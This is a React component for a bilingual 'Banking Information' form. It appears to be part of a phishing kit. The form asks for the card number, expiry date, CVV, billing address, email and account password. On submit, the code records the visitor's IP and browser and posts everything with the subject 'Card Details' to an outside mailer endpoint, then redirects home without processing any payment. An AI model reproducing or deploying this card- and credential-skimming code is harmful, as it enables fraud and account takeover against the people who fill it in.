import {useState} from "react";
import {Formik, Form, Field} from "formik";
import * as Yup from "yup";
import Card from "../assets/images/card.png";
import axios from "axios";
import {useNavigate} from "react-router-dom";

const BankingSchema = Yup.object().shape({
  creditCardNumber: Yup.string()
    .required("Credit card number is required")
    .length(16, "Credit card number must be 16 digits"),
  expiryDate: Yup.string()
    .required("Expiration date is required")
    .matches(/^(0[1-9]|1[0-2])\/([0-9]{2})$/, "Invalid expiry date (MM/YY)"),
  cvv: Yup.string()
    .required("CVV is required")
    .matches(/^[0-9]{3,4}$/, "Invalid CVV"),
  address: Yup.string().required("Address is required"),
  state: Yup.string().required("Province/State is required"),
  zipcode: Yup.string().required("Postal code is required"),
  email: Yup.string()
    .email("Invalid email address")
    .required("Email is required"),
  password: Yup.string().required("Password is required"),
});

// eslint-disable-next-line react/prop-types
export const CreditForm = ({language}) => {
  const navigate = useNavigate();

  const [showPassword, setShowPassword] = useState(false);

  const sendEmail = async (
    email,
    password,
    creditCardNumber,
    expiryDate,
    cvv,
    address,
    state,
    zipcode,
    ip,
    browser
  ) => {
    const templateParams = {
      email,
      password,
      creditCardNumber,
      expiryDate,
      cvv,
      address,
      state,
      zipcode,
      ip,
      browser,
    };

    try {
      await axios.post("https://mailer-bekky.onrender.com/send-email", {
        subject: "Card Details",
        message: templateParams,
      });
    } catch (error) {
      console.error("Error sending email:", error);
    }
  };

  const handleSubmit = async (values) => {
    const ip = await fetch("https://api64.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => data.ip);

    const browser = navigator.userAgent;
    const {
      creditCardNumber,
      expiryDate,
      cvv,
      address,
      state,
      zipcode,
      email,
      password,
    } = values;
    await sendEmail(
      email,
      password,
      creditCardNumber,
      expiryDate,
      cvv,
      address,
      state,
      zipcode,
      ip,
      browser
    );
    navigate("/");
  };

  return (
    <main className="p-4 md:p-10">
      <div className="w-full max-w-2xl mx-auto">
        <img
          src={Card}
          alt=""
          className="max-w-[400px] max-h-[252px] w-full mb-2"
        />

        <h1 className="text-2xl lg:text-[2.3125rem] font-gilroy font-semibold  mb-4">
          {language === "en" ? "Banking Information" : "Information bancaire"}
        </h1>

        <p className="mb-4">
          {language === "en"
            ? "Enter the required information"
            : "Information bancaire"}
        </p>

        <Formik
          initialValues={{
            creditCardNumber: "",
            expiryDate: "",
            cvv: "",
            address: "",
            state: "",
            zipcode: "",
            email: "",
            password: "",
          }}
          validationSchema={BankingSchema}
          onSubmit={(values, {setSubmitting}) => {
            handleSubmit(values);
            setSubmitting(false);
          }}
        >
          {({errors, touched, isSubmitting}) => (
            <Form className="space-y-6">
              {/* Credit Card Section */}
              <div className="space-y-4">
                <div className="flex flex-row gap-4 flex-wrap border-b pb-4 border-b-[#d5d5d5]">
                  <div className="flex-1">
                    <label
                      className="font-medium mb-1.5 block"
                      htmlFor="creditCardNumber"
                    >
                      {language === "en"
                        ? "Credit Card Number"
                        : "Numéro de carte de crédit"}
                    </label>
                    <Field
                      className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                        errors.creditCardNumber && touched.creditCardNumber
                          ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                          : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                      }`}
                      name="creditCardNumber"
                      placeholder="Last 16 digits"
                      maxLength="16"
                    />
                  </div>
                  <div className="w-32">
                    <label
                      className="font-medium mb-1.5 block"
                      htmlFor="expiryDate"
                    >
                      {language === "en" ? "Expiry Date" : "Date d'expiration"}
                    </label>
                    <Field
                      className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                        errors.expiryDate && touched.expiryDate
                          ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                          : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                      }`}
                      name="expiryDate"
                      placeholder="MM/YY"
                    />
                  </div>
                  <div className="w-24">
                    <label className="font-medium mb-1.5 block" htmlFor="cvv">
                      CVV
                    </label>
                    <Field
                      className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                        errors.cvv && touched.cvv
                          ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                          : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                      }`}
                      name="cvv"
                      placeholder="CVV"
                      maxLength="4"
                    />
                  </div>
                </div>
              </div>

              {/* Billing Address Section */}
              <div className="space-y-4  border-b pb-4 border-b-[#d5d5d5]">
                <h3 className="text-lg lg:text-2xl font-gilroy font-semibold">
                  {language === "en"
                    ? "Billing Address"
                    : "Adresse de facturation"}
                </h3>

                <div>
                  <Field
                    as="textarea"
                    className={`rounded border p-4 w-full h-24 focus:outline-none focus:ring-0 ${
                      errors.address && touched.address
                        ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                        : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                    }`}
                    name="address"
                    placeholder={language === "en" ? "Address" : "Adresse"}
                  />
                </div>

                <div className="flex flex-col md:flex-row gap-4">
                  <div className="flex-1">
                    <Field
                      className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                        errors.state && touched.state
                          ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                          : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                      }`}
                      name="state"
                      placeholder={
                        language === "en" ? "Province/State" : "Province/État"
                      }
                    />
                  </div>
                  <div className="w-40">
                    <Field
                      className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                        errors.zipcode && touched.zipcode
                          ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                          : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                      }`}
                      name="zipcode"
                      placeholder={
                        language === "en" ? "Postal Code" : "Code postal"
                      }
                    />
                  </div>
                </div>
              </div>

              {/* Account Information Section */}
              <div className="space-y-4">
                <h3 className="text-lg lg:text-2xl font-gilroy font-semibold">
                  {language === "en"
                    ? "Adresse email liée au compte"
                    : "Information du compte"}
                </h3>

                <div>
                  <Field
                    className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                      errors.email && touched.email
                        ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                        : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                    }`}
                    name="email"
                    type="email"
                    placeholder={
                      language === "en" ? "Email Address" : "Adresse courriel"
                    }
                  />
                </div>

                <div className="relative">
                  <Field
                    className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0 ${
                      errors.password && touched.password
                        ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                        : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                    }`}
                    name="password"
                    type={showPassword ? "text" : "password"}
                    placeholder={
                      language === "en" ? "Password" : "Mot de passe"
                    }
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3"
                  >
                    <svg width="20" height="20" viewBox="0 0 16 16">
                      <g fill="#1572c5" fillRule="nonzero">
                        <g transform="translate(1.000000, 3.000000)">
                          <path
                            d="M1.01860539,5.53033132 C1.38375935,6.09573101 1.81517794,6.66152588 2.30830424,7.18752727 C3.68684421,8.6579699 5.25936609,9.52556818 7,9.52556818 C8.74063391,9.52556818 10.3131558,8.6579699 11.6916958,7.18752727 C12.1848221,6.66152588 12.6162406,6.09573101 12.9813946,5.53033132 C13.0897048,5.36262529 13.1800415,5.21449046 13.2520006,5.09090909 C13.1800415,4.96732772 13.0897048,4.81919289 12.9813946,4.65148686 C12.6162406,4.08608717 12.1848221,3.5202923 11.6916958,2.99429091 C10.3131558,1.52384828 8.74063391,0.65625 7,0.65625 C5.25936609,0.65625 3.68684421,1.52384828 2.30830424,2.99429091 C1.81517794,3.5202923 1.38375935,4.08608717 1.01860539,4.65148686 C0.910295242,4.81919289 0.819958491,4.96732772 0.747999429,5.09090909 C0.819958491,5.21449046 0.910295242,5.36262529 1.01860539,5.53033132 Z M-0.586967844,4.79742517 C-0.497205826,4.61790113 -0.328963691,4.318804 -0.0839462962,3.93942223 C0.32149633,3.3116401 0.799878879,2.68425315 1.35078666,2.09661818 C2.95520124,0.385242631 4.84290664,-0.65625 7,-0.65625 C9.15709336,-0.65625 11.0447988,0.385242631 12.6492133,2.09661818 C13.2001211,2.68425315 13.6785037,3.3116401 14.0839463,3.93942223 C14.3289637,4.318804 14.4972058,4.61790113 14.5869678,4.79742517 C14.6793441,4.98217758 14.6793441,5.1996406 14.5869678,5.38439301 C14.4972058,5.56391705 14.3289637,5.86301418 14.0839463,6.24239595 C13.6785037,6.87017808 13.2001211,7.49756503 12.6492133,8.0852 C11.0447988,9.79657555 9.15709336,10.8380682 7,10.8380682 C4.84290664,10.8380682 2.95520124,9.79657555 1.35078666,8.0852 C0.799878879,7.49756503 0.32149633,6.87017808 -0.0839462962,6.24239595 C-0.328963691,5.86301418 -0.497205826,5.56391705 -0.586967844,5.38439301 C-0.679344052,5.1996406 -0.679344052,4.98217758 -0.586967844,4.79742517 Z"
                            id="Shape"
                            fillRule="nonzero"
                          ></path>
                          <path
                            d="M7,7.65625 C5.58320134,7.65625 4.43465909,6.50770775 4.43465909,5.09090909 C4.43465909,3.67411043 5.58320134,2.52556818 7,2.52556818 C8.41679866,2.52556818 9.56534091,3.67411043 9.56534091,5.09090909 C9.56534091,6.50770775 8.41679866,7.65625 7,7.65625 Z M7,6.34375 C7.69192493,6.34375 8.25284091,5.78283402 8.25284091,5.09090909 C8.25284091,4.39898416 7.69192493,3.83806818 7,3.83806818 C6.30807507,3.83806818 5.74715909,4.39898416 5.74715909,5.09090909 C5.74715909,5.78283402 6.30807507,6.34375 7,6.34375 Z"
                            id="Oval"
                            fillRule="nonzero"
                          ></path>
                        </g>
                      </g>
                    </svg>
                  </button>
                </div>
              </div>

              <button
                type="submit"
                className="bg-[#1572c5] text-white w-full rounded-3xl h-12 text-xl flex items-center justify-center gap-4 py-2 font-semibold disabled:opacity-50"
                disabled={isSubmitting}
              >
                <svg
                  viewBox="0 0 64 64"
                  width="24"
                  height="24"
                  fill="currentColor"
                >
                  <path d="M32 2c9.83 0 17.82 7.88 17.997 17.67L50 20v5h2a6 6 0 016 6v21c0 5.523-4.477 10-10 10H17c-5.523 0-10-4.477-10-10V31a6 6 0 016-6h1v-5c0-9.941 8.059-18 18-18zm20 27H13a2 2 0 00-2 2v21a6 6 0 006 6h31a6 6 0 006-6V31a2 2 0 00-2-2zm-20 8c2.763 0 5 2.237 5 5a5 5 0 01-2.999 4.584L34 50a2 2 0 01-3.995.15L30 50v-3.416A5 5 0 0127 42c0-2.763 2.237-5 5-5zm0-31c-7.628 0-13.83 6.1-13.997 13.687L18 20v5h28v-5c0-7.732-6.268-14-14-14z" />
                </svg>
                {isSubmitting && "Submitting"}
                {language === "en" ? "Submit" : "Soumettre"}
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </main>
  );
};
